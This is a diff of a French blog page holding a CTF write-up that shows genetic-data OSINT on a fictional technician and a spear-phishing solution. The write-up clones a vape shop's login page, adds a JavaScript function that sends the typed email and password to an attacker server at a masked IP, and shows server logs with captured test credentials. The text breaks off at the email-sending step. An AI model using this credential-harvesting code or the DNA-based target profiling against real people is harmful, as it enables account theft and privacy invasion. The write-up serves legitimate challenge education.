@@ -11,7 +11,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.55.6" />
+<meta name="generator" content="Hugo 0.80.0" />
 
     
     
@@ -28,8 +28,8 @@
 <meta property="og:description" content="Le CTF Inter IUT est une initiative de l&rsquo;ENSIBS lancée il y a quelques années. Étant en ligne et ouvert à tous cette année, nous avons avec un petit groupe d&rsquo;amis jeté un oeil aux différents challenges. Ce post explicite la solution du challenge &ldquo;La DGSE, c&rsquo;est moi&rdquo; sur des thématiques OSINT et Social Engineering." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://haax9.github.io/fr/writeups/inter-iut-2020/osint_se_challenge/" />
-<meta property="article:published_time" content="2020-11-29T00:00:00&#43;00:00"/>
-<meta property="article:modified_time" content="2020-11-29T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+<meta property="article:published_time" content="2020-11-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-11-29T00:00:00+00:00" /><meta property="og:site_name" content="Haax - Personal Blog" />
 
 
     
@@ -52,6 +52,32 @@
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'G-GB7QC0EDF8', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
     
 
 </head>
@@ -170,7 +196,7 @@
       <a rel="alternate" href="/en/writeups/inter-iut-2020/osint_se_challenge/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
       </div>
     <p class="copyright">
-      &copy; 2022 Haax.
+      &copy; 2023 Haax.
       <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
       <br/>Built with
       <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
@@ -197,43 +223,35 @@
     
     
     <br/>
-    <i class="fas fa-clock"></i> 10 min read
+    <i class="fas fa-clock"></i> 9 min read
 </div>
 
 
   </header>
   <div class="post">
     <p>Le CTF Inter IUT est une initiative de l&rsquo;ENSIBS lancée il y a quelques années. Étant en ligne et ouvert à tous cette année, nous avons avec un petit groupe d&rsquo;amis jeté un oeil aux différents challenges. Ce post explicite la solution du challenge &ldquo;La DGSE, c&rsquo;est moi&rdquo; sur des thématiques OSINT et Social Engineering.</p>
-
 <p>Ayant eu l&rsquo;occasion de co-organiser l&rsquo;édition 2018 du challenge InterIUT lorsque j&rsquo;étais étudiant à l&rsquo;ENSIBS et compte tenu de l&rsquo;ouverture au public cette année, nous avons souhaité tester quelques challenges. Celui-ci porte notamment sur des notions OSINT en lien avec les tests ADN accessibles au public, puis d&rsquo;une partie de &ldquo;Social Engineering&rdquo; afin de récupérer des informations. C&rsquo;était notamment l&rsquo;occasion de réaliser le pire phishing du monde (ou le plus crade!).</p>
-
 <h2 id="sommaire">Sommaire</h2>
-
 <ul>
 <li><a href="#sommaire">Sommaire</a></li>
-<li><a href="#énoncé">Énoncé</a></li>
-<li><a href="#analyse-du-fichier-et-recherche-d-éléments">Analyse du fichier et recherche d&rsquo;éléments</a></li>
-<li><a href="#séquence-adn-et-traits-de-caractère">Séquence ADN et traits de caractère</a></li>
-<li><a href="#préparation-du-phishing">Préparation du phishing</a>
-
+<li><a href="#%C3%A9nonc%C3%A9">Énoncé</a></li>
+<li><a href="#analyse-du-fichier-et-recherche-d-%C3%A9l%C3%A9ments">Analyse du fichier et recherche d&rsquo;éléments</a></li>
+<li><a href="#s%C3%A9quence-adn-et-traits-de-caract%C3%A8re">Séquence ADN et traits de caractère</a></li>
+<li><a href="#pr%C3%A9paration-du-phishing">Préparation du phishing</a>
 <ul>
 <li><a href="#leurre-et-payload">Leurre et Payload</a></li>
 <li><a href="#page-et-infrastructure">Page et Infrastructure</a></li>
 <li><a href="#test-de-fonctionnement">Test de fonctionnement</a></li>
-<li><a href="#expéditeur-et-e-mail">Expéditeur et E-mail</a></li>
-</ul></li>
+<li><a href="#exp%C3%A9diteur-et-e-mail">Expéditeur et E-mail</a></li>
+</ul>
+</li>
 <li><a href="#phish-and-flag">Phish and Flag</a></li>
 </ul>
-
 <h2 id="énoncé">Énoncé</h2>
-
 <pre><code>Après d'intensives recherches vous avez trouvé un fichier étrange concernant
 un des techniciens de RandomCorp. Basez-vous sur ce fichier pour récupérer ses
 identifiants en le contactant à l'adresse darkx.kevin@protonmail.com
-</code></pre>
-
-<p>L&rsquo;énoncé nous laisse également avec un fichier &ldquo;jml.txt&rdquo;, contenant le paragraphe suivant d&rsquo;en-tête ainsi que environ 640.000 lignes telles que celles ci-dessous.</p>
-
+</code></pre><p>L&rsquo;énoncé nous laisse également avec un fichier &ldquo;jml.txt&rdquo;, contenant le paragraphe suivant d&rsquo;en-tête ainsi que environ 640.000 lignes telles que celles ci-dessous.</p>
 <pre><code># This data file generated by 23andMe at: Sun Nov 23 12:27:13 2020
 #
 # This file contains raw genotype data, including data that is not used in 23andMe reports.
@@ -252,201 +270,136 @@ identifiants en le contactant à l'adresse darkx.kevin@protonmail.com
 # More information on reference human assembly builds:
 # https://www.ncbi.nlm.nih.gov/assembly/GCF_000001405.13/
 #
-# rsid  chromosome  position    genotype
-rs548049170 1   69869   TT
-rs13328684  1   74792   --
-rs9283150   1   565508  AA
-i713426 1   726912  AA
-rs116587930 1   727841  GG
-rs3131972   1   752721  GG
-rs12184325  1   754105  CC
-rs12567639  1   756268  AA
-rs114525117 1   759036  GG
-rs12124819  1   776546  GG
-rs12127425  1   794332  GG
-rs79373928  1   801536  TT
-rs72888853  1   815421  --
-rs7538305   1   824398  AA
-rs28444699  1   830181  AA
-</code></pre>
-
-<h2 id="analyse-du-fichier-et-recherche-d-éléments">Analyse du fichier et recherche d&rsquo;éléments</h2>
-
+# rsid	chromosome	position	genotype
+rs548049170	1	69869	TT
+rs13328684	1	74792	--
+rs9283150	1	565508	AA
+i713426	1	726912	AA
+rs116587930	1	727841	GG
+rs3131972	1	752721	GG
+rs12184325	1	754105	CC
+rs12567639	1	756268	AA
+rs114525117	1	759036	GG
+rs12124819	1	776546	GG
+rs12127425	1	794332	GG
+rs79373928	1	801536	TT
+rs72888853	1	815421	--
+rs7538305	1	824398	AA
+rs28444699	1	830181	AA
+</code></pre><h2 id="analyse-du-fichier-et-recherche-déléments">Analyse du fichier et recherche d&rsquo;éléments</h2>
 <p>Premièrement, qu&rsquo;est-ce que ce fichier ?
 On peut tout d&rsquo;abord lire les 2 premières lignes.</p>
-
 <pre><code># This data file generated by 23andMe at: Sun Nov 23 12:27:13 2020
 # This file contains raw genotype data, including data that is not used in 23andMe reports.
-</code></pre>
-
-<p>On a donc ce qui semble être les données du génome d&rsquo;une personne. Si l&rsquo;on en croit l&rsquo;énoncé, il s&rsquo;agirait d&rsquo;informations à propos de notre cible. On y apprend également que ces données ont été générées par le site &ldquo;23andMe&rdquo;.
+</code></pre><p>On a donc ce qui semble être les données du génome d&rsquo;une personne. Si l&rsquo;on en croit l&rsquo;énoncé, il s&rsquo;agirait d&rsquo;informations à propos de notre cible. On y apprend également que ces données ont été générées par le site &ldquo;23andMe&rdquo;.
 Une simple recherche Google nous permet d&rsquo;apprendre que ce service &ldquo;propose une analyse du code génétique aux particuliers&rdquo;.</p>
-
-<p><center><img src="/img/writeups/inter-iut-2020/OSINT_1.png" alt="OSINT_SE_1" class="imgSize2"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Vous avez certainement déjà entendu parler de ces services, de plus en plus démocratisés depuis quelques années. Mais il s&rsquo;avère qu&rsquo;ils peuvent être controversés ! En effet, on ne sait jamais où vont les données ;)
 Ainsi, ce type de données peut être un vecteur intéressant de recherche en sources ouvertes.</p>
-
-<p>Une très bonne présentation a d&rsquo;ailleurs été réalisée il y a tout juste un an par Renaud Lifchitz à ce sujet lors de la conférence UYBHYS 2019 (<a href="https://speakerdeck.com/rlifchitz/diy-dna-osint-or-dot-dot-dot-how-to-enhance-your-social-engineering-skills-using-recent-genomics" target="blank">lien</a>)</p>
-
+<p>Une très bonne présentation a d&rsquo;ailleurs été réalisée il y a tout juste un an par Renaud Lifchitz à ce sujet lors de la conférence UYBHYS 2019 (<!-- raw HTML omitted -->lien<!-- raw HTML omitted -->)</p>
 <p>On y apprend notamment qu&rsquo;il est possible de faire analyser ces données brutes afin de récupérer des éléments tels que les traits de caractère d&rsquo;une personne. À ce stade et compte tenu de l&rsquo;énoncé, la piste d&rsquo;un phishing ciblé (spear phishing) sur notre cher Kévin devient probable.
-<br/></p>
-
+<!-- raw HTML omitted --></p>
 <h2 id="séquence-adn-et-traits-de-caractère">Séquence ADN et traits de caractère</h2>
-
-<p>Il existe plusieurs outils permettant d&rsquo;analyser ce type de données. La plupart du temps payants, il est néanmoins possible dans certains cas d&rsquo;avoir certains résultats gratuits. C&rsquo;est notamment le cas de <a href="https://genomelink.io" target="blank">GenomeLink.io</a> qui offre la possibilité d&rsquo;uploader des données brutes et de récupérer de manière gratuite des &ldquo;traits&rdquo;.</p>
-
+<p>Il existe plusieurs outils permettant d&rsquo;analyser ce type de données. La plupart du temps payants, il est néanmoins possible dans certains cas d&rsquo;avoir certains résultats gratuits. C&rsquo;est notamment le cas de <!-- raw HTML omitted -->GenomeLink.io<!-- raw HTML omitted --> qui offre la possibilité d&rsquo;uploader des données brutes et de récupérer de manière gratuite des &ldquo;traits&rdquo;.</p>
 <p>Ainsi, après avoir créé un faux compte et fourni le fichier brut, on peut récupérer les traits suivants.</p>
-
-<p><center><img src="/img/writeups/inter-iut-2020/OSINT_2.png" alt="OSINT_SE_2" class="imgSize2"/></center></p>
-
-<p><center><img src="/img/writeups/inter-iut-2020/OSINT_3.png" alt="OSINT_SE_3" class="imgSize2"/></center></p>
-
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
 <p>Plusieurs éléments sont intéressants ici et pourraient service de levier. Par exemple, notre cible semble avoir une tendance à fumer, comme le montre l&rsquo;analyse des données.</p>
-
-<p><center><img src="/img/writeups/inter-iut-2020/OSINT_4.png" alt="OSINT_SE_4" class="imgSize2"/></center></p>
-
+<!-- raw HTML omitted -->
 <p>Bien que d&rsquo;autres traits pourraient être utilisés, nous avons utilisé celui-ci pour définir notre scénario.
-<br/></p>
-
+<!-- raw HTML omitted --></p>
 <h2 id="préparation-du-phishing">Préparation du phishing</h2>
-
 <h4 id="leurre-et-payload">Leurre et Payload</h4>
-
 <p>Bien ! On sait donc que nous sommes en présence d&rsquo;une personne pouvant fumer et que nous devons le contacter afin de récupérer ses identifiants.
 Bien entendu, lui demander gentiment n&rsquo;est pas suffisant. :)
 C&rsquo;est dans cette optique que nous avons opté pour une petite attaque par phishing.</p>
-
 <p>Première étape, définir le payload et le leurre utilisé.
 Nous voulons récupérer des identifiants. La manière la plus simple semble donc de proposer à la victime une fausse page de login sur laquelle nous avons une visibilité.</p>
-
 <p>Nous sommes en 2020 et beaucoup de personnes utilisent maintenant des vapoteuses pour fumer. Nous sommes donc parti dans l&rsquo;idée d&rsquo;utiliser cela. L&rsquo;une des plus grosses boutiques en France aujourd&rsquo;hui se nomme &ldquo;Le Petit Vapoteur&rdquo;. Si notre cible utilise ce type de produit, alors il est probable qu&rsquo;il dispose d&rsquo;un compte sur ce type de plateforme.</p>
-
 <p>Ainsi, dans le cadre de ce challenge, nous allons copier de manière temporaire l&rsquo;image de ces derniers.</p>
-
 <h4 id="page-et-infrastructure">Page et Infrastructure</h4>
-
 <p>Âmes sensibles, s&rsquo;abstenir, cette partie est méchamment quick&amp;dirty. Mais bon.. Comme disait ma grand-mère : &ldquo;C&rsquo;est moche, mais ça marche&rdquo;.</p>
-
 <p>On se rend donc sur la page de connexion de notre leurre, on affiche le code source de la page et on lance notre plus beau copy/paste dans l&rsquo;éditeur de notre choix.</p>
-
 <p>La page en question est trèèès longue et contient beaucoup de code (~13.000 lignes). C&rsquo;est ok car on veut une fausse page ressemblante. Deux éléments sont intéressants ici.</p>
-
 <p>Premièrement, le formulaire de login. Les seules modifications apportées à ce dernier sont le passage en GET (je vous avais prevenu&hellip;) car on souhaite juste récupérer les données rapidement, et l&rsquo;action effectuée.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://xx.xx.xx.xx:8000/test.html&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;login_form_inpop&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;loginForm&#34;</span> <span style="color:#a6e22e">data-elegantForm</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1&#34;</span>&gt;
+				&lt;<span style="color:#f92672">p</span>&gt;
+					&lt;<span style="color:#f92672">label</span>&gt;
+						&lt;<span style="color:#f92672">span</span>&gt;E-mail&lt;/<span style="color:#f92672">span</span>&gt;
+						&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;log_email&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> <span style="color:#a6e22e">required</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;required&#34;</span> <span style="color:#a6e22e">autocomplete</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;email&#34;</span> /&gt;
+					&lt;/<span style="color:#f92672">label</span>&gt;
+				&lt;/<span style="color:#f92672">p</span>&gt;
+				&lt;<span style="color:#f92672">p</span>&gt;
+					&lt;<span style="color:#f92672">label</span>&gt;
+						&lt;<span style="color:#f92672">span</span>&gt;Mot de Passe&lt;/<span style="color:#f92672">span</span>&gt;
+						&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;log_passwd&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;passwd&#34;</span> <span style="color:#a6e22e">required</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;required&#34;</span> <span style="color:#a6e22e">autocomplete</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;current-password&#34;</span> /&gt;
+					&lt;/<span style="color:#f92672">label</span>&gt;
+				&lt;/<span style="color:#f92672">p</span>&gt;				
+				&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;form-material-footer&#34;</span>&gt;
+					&lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SubmitLogin&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn btn-vert&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SubmitLogin&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;connection()&#34;</span>&gt;
+						Identifiez vous
+					&lt;/<span style="color:#f92672">button</span>&gt;
+					&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn btn-gris&#34;</span> <span style="color:#a6e22e">role</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://www.lepetitvapoteur.com/fr/mot-de-passe-oublie&#34;</span>&gt;Mot de passe oublié ?&lt;/<span style="color:#f92672">a</span>&gt;
 
-<pre><code class="language-html">&lt;form action=&quot;http://xx.xx.xx.xx:8000/test.html&quot; method=&quot;GET&quot; id=&quot;login_form_inpop&quot; class=&quot;loginForm&quot; data-elegantForm=&quot;1&quot;&gt;
-                &lt;p&gt;
-                    &lt;label&gt;
-                        &lt;span&gt;E-mail&lt;/span&gt;
-                        &lt;input type=&quot;email&quot; id=&quot;log_email&quot; name=&quot;email&quot; required=&quot;required&quot; autocomplete=&quot;email&quot; /&gt;
-                    &lt;/label&gt;
-                &lt;/p&gt;
-                &lt;p&gt;
-                    &lt;label&gt;
-                        &lt;span&gt;Mot de Passe&lt;/span&gt;
-                        &lt;input type=&quot;password&quot; id=&quot;log_passwd&quot; name=&quot;passwd&quot; required=&quot;required&quot; autocomplete=&quot;current-password&quot; /&gt;
-                    &lt;/label&gt;
-                &lt;/p&gt;                
-                &lt;div class=&quot;form-material-footer&quot;&gt;
-                    &lt;button name=&quot;SubmitLogin&quot; class=&quot;btn btn-vert&quot; id=&quot;SubmitLogin&quot; onclick=&quot;connection()&quot;&gt;
-                        Identifiez vous
-                    &lt;/button&gt;
-                    &lt;a class=&quot;btn btn-gris&quot; role=&quot;button&quot; href=&quot;https://www.lepetitvapoteur.com/fr/mot-de-passe-oublie&quot;&gt;Mot de passe oublié ?&lt;/a&gt;
-
-                &lt;/div&gt;
-                &lt;div class=&quot;show-error&quot;&gt;&lt;/div&gt;
-                &lt;div class=&quot;show-success&quot;&gt;Connexion réussie&lt;/div&gt;
-            &lt;/form&gt;
-````
-
-D'autres part, nous avons remarqué après quelques tests qu'un morceau de JQuery est utilisé sur la page légitime et interfère dans la connexion. Ce dernier a donc été supprimé de la page au profit d'une petite fonction Javascript permettant de créer la requête GET au moment de la soumission du formulaire dans le vide (et là, c'est merci &lt;a href=&quot;https://twitter.com/driikolu?lang=fr&quot; target=&quot;blank&quot;&gt;@Driikolu&lt;/a&gt; pour le trick).
-
-```html
-function connection() {
-    var login = document.getElementById(&quot;log_email&quot;).value;
-    var psswd = document.getElementById(&quot;log_passwd&quot;).value;
-    const Http = new XMLHttpRequest();
-    const url='http://xx.xx.xx.xx:8000';
-    Http.open(&quot;GET&quot;, url+&quot;?mail=&quot;+login+&quot;&amp;passwd=&quot;+psswd);
-    Http.send();
+				&lt;/<span style="color:#f92672">div</span>&gt;
+				&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;show-error&#34;</span>&gt;&lt;/<span style="color:#f92672">div</span>&gt;
+				&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;show-success&#34;</span>&gt;Connexion réussie&lt;/<span style="color:#f92672">div</span>&gt;
+			&lt;/<span style="color:#f92672">form</span>&gt;
+</code></pre></div><p>D&rsquo;autres part, nous avons remarqué après quelques tests qu&rsquo;un morceau de JQuery est utilisé sur la page légitime et interfère dans la connexion. Ce dernier a donc été supprimé de la page au profit d&rsquo;une petite fonction Javascript permettant de créer la requête GET au moment de la soumission du formulaire dans le vide (et là, c&rsquo;est merci <!-- raw HTML omitted -->@Driikolu<!-- raw HTML omitted --> pour le trick).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">function connection() {
+	var login = document.getElementById(&#34;log_email&#34;).value;
+	var psswd = document.getElementById(&#34;log_passwd&#34;).value;
+	const Http = new XMLHttpRequest();
+	const url=&#39;http://xx.xx.xx.xx:8000&#39;;
+	Http.open(&#34;GET&#34;, url+&#34;?mail=&#34;+login+&#34;&amp;passwd=&#34;+psswd);
+	Http.send();
 }
-</code></pre>
-
-<p>La page est maintenant prête ! Il faut maintenant un serveur web afin de simuler le site en question. Là encore, nous aurions pu utiliser quelquechose de propre tel que Gophish, mais j&rsquo;avais clairement la flemme de mettre en place ce type d&rsquo;infrastructure pour un challenge &ldquo;rapide&rdquo;. On a donc opté pour autre chose (la solution va vous étonner).</p>
-
+</code></pre></div><p>La page est maintenant prête ! Il faut maintenant un serveur web afin de simuler le site en question. Là encore, nous aurions pu utiliser quelquechose de propre tel que Gophish, mais j&rsquo;avais clairement la flemme de mettre en place ce type d&rsquo;infrastructure pour un challenge &ldquo;rapide&rdquo;. On a donc opté pour autre chose (la solution va vous étonner).</p>
 <p>Au moyen d&rsquo;un petit VPS, on se créé un petit espace de travail dans lequel on place nos deux fichiers HTML.</p>
-
-<pre><code class="language-bash">~/tmp$ ls
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~/tmp$ ls
 index.html  test.html
-</code></pre>
-
-<p>Et on lance un joli server HTTP Python pour mettre le tout en ligne (Je sais, je sais&hellip; C&rsquo;EST MOCHE)</p>
-
-<pre><code class="language-bash">$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-</code></pre>
-
-<p>On se rend ensuite via un navigateur web sur l&rsquo;adresse IP de notre VPS en spécifiant le port 8000 utilisé et tadaaam !</p>
-
-<p><center><img src="/img/writeups/inter-iut-2020/OSINT_5.png" alt="OSINT_SE_5" class="imgSize2"/></center></p>
-
+</code></pre></div><p>Et on lance un joli server HTTP Python pour mettre le tout en ligne (Je sais, je sais&hellip; C&rsquo;EST MOCHE)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</code></pre></div><p>On se rend ensuite via un navigateur web sur l&rsquo;adresse IP de notre VPS en spécifiant le port 8000 utilisé et tadaaam !</p>
+<!-- raw HTML omitted -->
 <h4 id="test-de-fonctionnement">Test de fonctionnement</h4>
-
 <p>Afin de valider que tout fonctionne correctement, on peut simuler le comportement d&rsquo;une victime qui se rend sur la page.</p>
-
-<pre><code class="language-bash">$ python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-xx.xx.xx.xx - - [29/Nov/2020 20:25:18] &quot;GET /index.html HTTP/1.1&quot; 200 -
-xx.xx.xx.xx - - [29/Nov/2020 20:25:18] code 404, message File not found
-xx.xx.xx.xx - - [29/Nov/2020 20:25:18] &quot;GET /themes/vapoteur/js/lazyLoad.js?v=20201127 HTTP/1.1&quot; 404 -
-xx.xx.xx.xx - - [29/Nov/2020 20:25:19] code 404, message File not found
-xx.xx.xx.xx - - [29/Nov/2020 20:25:19] &quot;GET /modules/vapoteurheaderrecherche/js/recherche.js?v=20201127 HTTP/1.1&quot; 404 -
-xx.xx.xx.xx - - [29/Nov/2020 20:25:19] code 404, message File not found
-xx.xx.xx.xx - - [29/Nov/2020 20:25:23] &quot;GET /modules/vapoteurheadermenu/img/star.svg HTTP/1.1&quot; 404 -
-xx.xx.xx.xx - - [29/Nov/2020 20:25:23] code 404, message File not found
-xx.xx.xx.xx - - [29/Nov/2020 20:25:23] &quot;GET /modules/vapoteurpwa/img/Icon-192.png HTTP/1.1&quot; 404 -
-xx.xx.xx.xx - - [29/Nov/2020 20:25:23] code 404, message File not found
-xx.xx.xx.xx - - [29/Nov/2020 20:25:23] &quot;GET /modules/vapoteurpwa/img/Icon-128.png HTTP/1.1&quot; 404 -
-[...]
-</code></pre>
-
-<p>Beaucoup d&rsquo;erreur 404 sont générées mais c&rsquo;est totalement normal car nous n&rsquo;avons pas à notre disposition les autres ressources chargées normalement par la page. Le tout devient intéressant lorsqu&rsquo;on tente de se &ldquo;connecter&rdquo;.</p>
-
-<pre><code class="language-bash">xx.xx.xx.xx - - [29/Nov/2020 20:25:23] code 404, message File not found
-xx.xx.xx.xx - - [29/Nov/2020 20:25:23] &quot;GET /modules/vapoteurpwa/img/Icon-128.png HTTP/1.1&quot; 404 -
-xx.xx.xx.xx - - [29/Nov/2020 20:25:50] &quot;GET /?mail=test@ctf.fr&amp;passwd=haaxPass HTTP/1.1&quot; 200 -
-</code></pre>
-
-<p>On récupère bien les données du formulaire en GET. C&rsquo;est moche&hellip; Mais ça marche :)</p>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:18<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /index.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:18<span style="color:#f92672">]</span> code 404, message File not found
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:18<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /themes/vapoteur/js/lazyLoad.js?v=20201127 HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:19<span style="color:#f92672">]</span> code 404, message File not found
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:19<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /modules/vapoteurheaderrecherche/js/recherche.js?v=20201127 HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:19<span style="color:#f92672">]</span> code 404, message File not found
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:23<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /modules/vapoteurheadermenu/img/star.svg HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:23<span style="color:#f92672">]</span> code 404, message File not found
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:23<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /modules/vapoteurpwa/img/Icon-192.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:23<span style="color:#f92672">]</span> code 404, message File not found
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:23<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /modules/vapoteurpwa/img/Icon-128.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</code></pre></div><p>Beaucoup d&rsquo;erreur 404 sont générées mais c&rsquo;est totalement normal car nous n&rsquo;avons pas à notre disposition les autres ressources chargées normalement par la page. Le tout devient intéressant lorsqu&rsquo;on tente de se &ldquo;connecter&rdquo;.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:23<span style="color:#f92672">]</span> code 404, message File not found
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:23<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /modules/vapoteurpwa/img/Icon-128.png HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> -
+xx.xx.xx.xx - - <span style="color:#f92672">[</span>29/Nov/2020 20:25:50<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /?mail=test@ctf.fr&amp;passwd=haaxPass HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
+</code></pre></div><p>On récupère bien les données du formulaire en GET. C&rsquo;est moche&hellip; Mais ça marche :)</p>
 <h4 id="expéditeur-et-e-mail">Expéditeur et E-mail</h4>
-
 <p>Bien ! D&rsquo;un point de vue technique, l&rsquo;attaque est prête. Il faut maintenant une accroche viable.
 Là encore, nous aurions pu réserver un nom de domaine crédible et s&rsquo;en servir pour l&rsquo;expéditeur de l&rsquo;email, mais là encore, on ne va pas s&rsquo;embêter et en plus dépenser de l&rsquo;argent&hellip; Alors un simple compte Gmail fera l&rsquo;affaire.</p>
-
